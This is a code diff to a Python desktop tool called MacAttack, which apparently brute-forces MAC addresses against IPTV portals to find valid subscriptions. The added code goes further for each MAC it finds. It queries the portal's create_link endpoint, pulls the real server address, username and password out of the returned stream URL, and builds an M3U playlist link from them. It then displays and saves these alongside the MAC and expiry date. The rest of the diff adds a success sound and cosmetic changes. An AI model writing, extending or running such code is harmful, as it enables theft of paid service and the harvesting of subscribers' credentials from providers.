@@ -1,4 +1,5 @@
 import os
+import time
 import re
 import json
 import random
@@ -8,7 +9,7 @@ import sys
 import vlc
 import base64
 from PyQt5.QtCore import QEvent,QByteArray, QBuffer, Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QTimer
-from PyQt5.QtGui import QPixmap, QIcon, QStandardItemModel, QStandardItem, QMouseEvent
+from PyQt5.QtGui import QFont, QPixmap, QIcon, QStandardItemModel, QStandardItem, QMouseEvent
 from PyQt5.QtWidgets import QMainWindow, QFrame, QApplication, QVBoxLayout, QLineEdit, QLabel, QPushButton, QWidget, QTabWidget, QMessageBox, QListView, QHBoxLayout, QCheckBox, QAbstractItemView, QProgressBar, QSpinBox, QTextEdit, QSpacerItem, QSizePolicy
 import requests
 import concurrent.futures
@@ -17,7 +18,10 @@ from urllib.parse import quote, urlparse, urlunparse
 import configparser
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
+os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
+import pygame
 
+pygame.mixer.init()
 #logging.basicConfig(level=logging.DEBUG)
 
 def get_token(session, url, mac_address):
@@ -324,8 +328,7 @@ class RequestThread(QThread):
         except Exception as e:
             logging.error(f"An error occurred while retrieving channels: {str(e)}")
             return []
-
-            
+       
 class VideoPlayerWorker(QThread):
     # Signal to emit stream URL when the request is successful
     stream_url_ready = pyqtSignal(str)
@@ -719,9 +722,7 @@ class MacAttack(QMainWindow):
         list_item.setData(data, Qt.UserRole)
         list_item.setData(item_type, Qt.UserRole + 1)
         return list_item
-            
-
-            
+                       
     def get_playlist(self):
         """
         Function to fetch and populate the playlist based on the hostname and MAC address input.
@@ -790,6 +791,12 @@ class MacAttack(QMainWindow):
         # autostop checkbox
         self.autostop_checkbox = QCheckBox("Stop the attack whenever a MAC is found")
         Settings_layout.addWidget(self.autostop_checkbox)
+
+        # successsound checkbox
+        self.successsound_checkbox = QCheckBox("Play a sound whenever a MAC is found")
+        Settings_layout.addWidget(self.successsound_checkbox)
+        
+        
         Settings_layout.addSpacing(150)  # Adds space
 
         # Add the "Tips" label
@@ -822,8 +829,8 @@ class MacAttack(QMainWindow):
         self.brute_mac_label.setText(text)
 
     def update_output_text(self, text):
-        """Update the QTextEdit widget in the main thread."""
-        self.output_text.append(text)  
+            """Update the QTextEdit widget in the main thread."""
+            self.output_text.append(text)
 
     def update_error_text(self, text):
         """Update the QTextEdit widget in the main thread."""
@@ -910,6 +917,8 @@ class MacAttack(QMainWindow):
         """)
         self.output_text.setPlainText("Output LOG:\nResults will appear here.\n")
         self.output_text.setReadOnly(True)
+        monospace_font = QFont("Lucida Console", 10)  # You can use "Courier New" or other monospaced fonts like "Consolas"
+        self.output_text.setFont(monospace_font)                        
         layout.addWidget(self.output_text)
 
         # Error Log Area
@@ -924,12 +933,10 @@ class MacAttack(QMainWindow):
         """)
         self.error_text.setHtml("Error LOG:<br>It's normal for a few errors to appear down here.<br>If <b>Empty response</b> errors are getting spammed, lower the speed.")
         self.error_text.setReadOnly(True)
+        self.error_text.setFont(monospace_font)
         layout.addWidget(self.error_text)
         layout.addSpacing(15)  # Adds space
-
-        
-
-        
+    
     def SaveTheDay(self):
         """Save user settings, including window geometry, active tab, and other preferences to the configuration file."""
         import os
@@ -947,6 +954,7 @@ class MacAttack(QMainWindow):
             'mac': self.mac_input.text(),
             'autoloadmac': str(self.autoloadmac_checkbox.isChecked()),  # Save autoloadmac checkbox state
             'autostop': str(self.autostop_checkbox.isChecked()),  # Save autostop checkbox state
+            'successsound': str(self.successsound_checkbox.isChecked()),  # Save autostop checkbox state
             'active_tab': str(self.tabs.currentIndex())  # Save the index of the active tab
         }
         
@@ -986,6 +994,10 @@ class MacAttack(QMainWindow):
             # Load autostop_checkbox state
             autostop_state = config.get('Settings', 'autostop', fallback="False")
             self.autostop_checkbox.setChecked(autostop_state == "True")  # Set checkbox based on saved state
+
+            # Load successsound_checkbox state
+            autostop_state = config.get('Settings', 'successsound', fallback="False")
+            self.successsound_checkbox.setChecked(autostop_state == "True")  # Set checkbox based on saved state
             
             # Load active tab
             active_tab = config.getint('Settings', 'active_tab', fallback=0)  # Default to first tab if not found
@@ -1080,6 +1092,44 @@ class MacAttack(QMainWindow):
 
                             count = 0
                             if res3.status_code == 200:
+                                
+                                url4 = f"{self.base_url}/portal.php?type=itv&action=create_link&cmd=http://localhost/ch/1_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
+                                res4 = s.get(url4, headers=headers, timeout=10, allow_redirects=False) 
+                                data4 = json.loads(res4.text)
+
+                                # Extract the 'cmd' value and strip the 'ffmpeg ' prefix
+                                cmd_value4 = data4["js"]["cmd"].replace("ffmpeg ", "", 1)
+                                logging.debug(cmd_value4)
+                                
+                                parsed_url = urlparse(cmd_value4)
+
+                                # Extract domain and port
+
+                                domain_and_port = f"{parsed_url.scheme}://{parsed_url.hostname}:{parsed_url.port}" if parsed_url.port else f"{parsed_url.scheme}://{parsed_url.hostname}"
+
+
+                                
+                                logging.debug(f"Real Host: {domain_and_port}")
+                                
+
+                                # Split the path into parts
+                                path_parts = parsed_url.path.strip("/").split("/")
+
+                                # Check if there are at least two subdirectories
+                                m3ufound = 0
+                                if len(path_parts) >= 3: #3 slashes for the 2nd subdir /dir1/dir2/
+                                    username = path_parts[0]
+                                    password = path_parts[1]
+                                    logging.debug(f"Username: {username}")
+                                    logging.debug(f"Password: {password}")
+                                    logging.debug(f"M3U: {domain_and_port}/get.php?username={username}&password={password}&type=m3u_plus")
+                                    m3ufound = 1
+                                else:
+                                    logging.debug("Less than 2 subdirectories found in the path.")
+                                    m3ufound = 0
+
+                                
+                                
                                 # Updated handling with type checks to avoid unexpected TypeErrors
                                 try:
                                     response_data = json.loads(res3.text)
@@ -1095,6 +1145,8 @@ class MacAttack(QMainWindow):
 
                             if count > 0:
                                 logging.debug("Mac found")
+              
+                                
                                 # Check if the autoloadmac_checkbox is checked
                                 if self.autoloadmac_checkbox.isChecked():
                                     # Insert the base URL into the hostname_input field
@@ -1104,14 +1156,46 @@ class MacAttack(QMainWindow):
 
                                 if self.output_file is None:
                                     output_filename = self.OutputMastermind()
-                                    self.output_file = open(output_filename, "a")
+                                    self.output_file = open(output_filename, "a")                                        
+                                    
+                                if m3ufound:
 
-                                result_message = f"{self.iptv_link}\nMAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n"
-                                self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit
+                                    result_message = (
+                                        f"{'Portal':<10} = {self.iptv_link}\n"
+                                        f"{'Real URL':<10} = {domain_and_port}\n"
+                                        f"{'MAC':<10} = {mac}\n"
+                                        f"{'Expiry':<10} = {expiry}\n"
+                                        f"{'Channels':<10} = {count}\n"
+                                        f"{'Username':<10} = {username}\n"
+                                        f"{'Password':<10} = {password}\n"
+                                        f"{'M3U':<10} = {domain_and_port}/get.php?username={username}&password={password}&type=m3u_plus\n"
+                                    )
 
+                                    self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit
+                                    
+                                    
+                                else: 
+                                    result_message = (
+                                        f"{'Portal':<10} = {self.iptv_link}\n"
+                                        f"{'MAC':<10} = {mac}\n"
+                                        f"{'Expiry':<10} = {expiry}\n"
+                                        f"{'Channels':<10} = {count}\n"
+                                    )
+                                    self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit
+                                    
                                 # Write result_message to the output file
                                 self.output_file.write(result_message)
                                 self.output_file.flush()  #Ensures data is written immediately
+                                
+                                
+                                
+
+                                if self.successsound_checkbox.isChecked():
+                                    sound_thread = threading.Thread(target=self.play_success_sound)
+                                    sound_thread.start()  # Start the background thread                     
+                                
+                                
+                                
                                 if self.autostop_checkbox.isChecked():
                                     logging.debug("autostop_checkbox is checked, stopping...")
                                     self.stop_button.click()                             
@@ -1134,6 +1218,23 @@ class MacAttack(QMainWindow):
                         self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
                     self.error_count += 1  # Increment the error count
                      
+    def play_success_sound(self):
+        # Determine the base path for the sound file
+        if getattr(sys, 'frozen', False):  # Check if the app is frozen (i.e., packaged with PyInstaller)
+            base_path = sys._MEIPASS
+        else:
+            base_path = os.path.abspath(".")
+
+        # Construct the path to the sound file
+        sound_path = os.path.join(base_path, 'include', 'success.mp3')
+
+        try:
+            # Load and play the sound
+            pygame.mixer.music.load(sound_path)
+            pygame.mixer.music.play()
+
+        except pygame.error as e:
+            logging.debug(f"Error playing sound: {e}")
 
     def OutputMastermind(self):
         # Fancy file-naming because why not complicate things?
@@ -1205,7 +1306,6 @@ class MacAttack(QMainWindow):
             tab_info["navigation_stack"] = []
             self.update_playlist_view(tab_name)
             
-
         logging.debug("Playlist data loaded into tabs.")
         self.current_request_thread = None
 
@@ -1402,7 +1502,6 @@ class MacAttack(QMainWindow):
                 else:
                     self.error_label.setText("Unknown item type")
                     self.error_label.setVisible(True)
-    #self.search_input.clear()
     
     def retrieve_series_info(self, tab_name, context_data, season_number=None):
         tab_info = self.tab_data[tab_name]
@@ -1881,12 +1980,7 @@ class MacAttack(QMainWindow):
             self.videoPlayer.play()  # Play the video when Mac VideoPlayer tab is selected
         else:
             self.videoPlayer.pause()  # Pause the video when the tab is not selected    
-    #def resizeEvent(self, event):
-        # VLC dynamic width
-    #    new_width = self.width() - 270
-    #    self.video_frame.setMinimumWidth(new_width)
-  
-    
+
     def closeEvent(self, event):
         # Save settings when the window is about to close
         self.SaveTheDay()
